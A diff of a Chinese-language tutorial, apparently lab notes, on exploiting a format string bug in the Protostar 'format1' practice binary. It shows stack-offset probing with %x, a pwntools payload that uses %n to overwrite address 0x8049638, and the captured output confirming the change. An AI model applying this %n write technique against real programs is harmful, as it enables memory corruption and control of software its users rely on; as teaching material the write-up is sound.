@@ -944,25 +944,55 @@ ffffd6fe ffffd71f ffffd760 ffffdf96 ffffdfa6 ffffdfdb 0
 ```
 可以看到 `8049638` 成功在 stack 中對齊了，接下來我們要不斷調整 `%x` 的數量，直到我們剛好印出的最後一個記憶體地址，就是 `8049638`。
 
-以下為嘗試使用 `134` 和 `136` 的結果
+以下為嘗試使用 `201` 和 `202` 的結果
 ```
-134:
-3174616d 41414100 41414141 41414141
-136:
-41414141 41414141 8049638 25424242 78252078
+201:
+662f2e00 616d726f 41003174 41414141
+202:
+726f662f 3174616d 41414100 41414141 8049638
 ```
-這邊我們推測，`134` 個 `%x` 後，也就是印出了 `134` 個 stack 中 word size 的內容，下一個記憶體地址便是 `8049638` 了，因此我們如果在 `"%x" * 134` 加上 `%n`，我們修改到的，便是 `0x8049638` 這個記憶體地址，我們使用以下 python 腳本進行驗證
+這邊我們推測，`201` 個 `%x` 後，也就是印出了 `201` 個 stack 中 word size 的內容，下一個記憶體地址便是 `8049638` 了，因此我們如果在 `"%x" * 201` 加上 `%n`，我們修改到的，便是 `0x8049638` 這個記憶體地址，我們使用以下 python 腳本進行驗證
 ```py
 from pwn import *
 
 address = "\x38\x96\x04\x08"
-payload = "AAAAAAAAAAAAA" + address + 'BBB'+"%x " * 134 + "%n"
+payload = "AAAAAAA" + address + 'BBBBBB' +"%x " * 201 + "%n"
 
 p = process(["./format1", payload])
 output = p.recvall()
 print(output)
 ```
+```
+python3 script.py
+sys:1: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
+[+] Starting local process './format1': pid 23801
+[+] Receiving all data: Done (1.46KB)
+[*] Process './format1' stopped with exit code 32 (pid 23801)
+b'AAAAAAA8\x96\x04\x08BBBBBBf7fd6f80 f7c184be f7fbe4a0 ffffcae0 f7fbe66c 
+ffffcac8 8048435 ffffcdb1 0 f7e2a000 f7d20ecb ffffcda7 70 f7ffd020 f7c21519 
+2 ffffcb84 ffffcb90 ffffcaf0 f7e2a000 804841c 2 ffffcb84 f7e2a000 ffffcb84 
+f7ffcb80 f7ffd020 a870f17d d3ccfb6d 0 0 0 f7ffcb80 f7ffd020 13e70c00 
+f7ffda40 f7c214a6 f7e2a000 f7c215f3 0 f7ffd000 2 8048340 0 f7fd8ff4 f7c2156d 
+f7ffd000 2 8048340 0 8048361 804841c 2 ffffcb84 8048450 8048440 f7fcaaa0 
+ffffcb7c f7ffda40 2 ffffcda7 ffffcdb1 0 ffffd020 ffffd037 ffffd046 ffffd05a 
+ffffd090 ffffd0c3 ffffd0da ffffd0e5 ffffd119 ffffd171 ffffd184 ffffd1a0 
+ffffd1eb ffffd1fd ffffd219 ffffd22f ffffd244 ffffd25a ffffd276 ffffd297 
+ffffd2b6 ffffd2cd ffffd2de ffffd2ed ffffd2ff ffffd318 ffffd32e ffffd341 
+ffffd350 ffffd362 ffffd372 ffffd386 ffffd395 ffffd3a4 ffffd3da ffffd411 
+ffffd443 ffffd4c3 ffffd4db ffffd4e8 ffffd52a ffffd53d ffffd55b ffffd56d 
+ffffd607 ffffd681 ffffd694 ffffd6c6 ffffd6ce ffffd6e1 ffffd710 ffffd726 
+ffffd73a ffffd746 ffffd759 ffffd77d ffffd78d ffffd7a7 ffffd7f5 ffffd80d 
+ffffd84b ffffd86a ffffd879 ffffd8ad ffffd8c4 ffffd8dc ffffd8ed ffffd927 
+ffffd93c ffffd947 ffffd95b ffffd96e ffffd98a ffffd995 ffffd99d ffffd9bd 
+ffffdfac ffffdfb6 ffffdfce ffffdfda 0 20 f7fc4540 21 f7fc4000 33 d30 10 
+178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 f7fc6000 8 0 9 8048340 b 3e8 c 
+3e8 d 3e8 e 3e8 17 0 19 ffffcd8b 1a 2 1f ffffdfee f ffffcd9b 0 0 0 32000000 
+a813e70c fd412bf2 464e0e19 691c5a15 363836 0 2e000000 726f662f 3174616d 
+41414100 41414141 you have modified the target :)\n'
+```
 我們成功使用格式化字串的漏洞，對無法存取的變數成功進行修改了。
+## 後測表單
+![](https://hackmd.io/_uploads/HyZENczH2.png)
 
 ## 參考資料
 [LiveOverflow](https://www.youtube.com/@LiveOverflow)
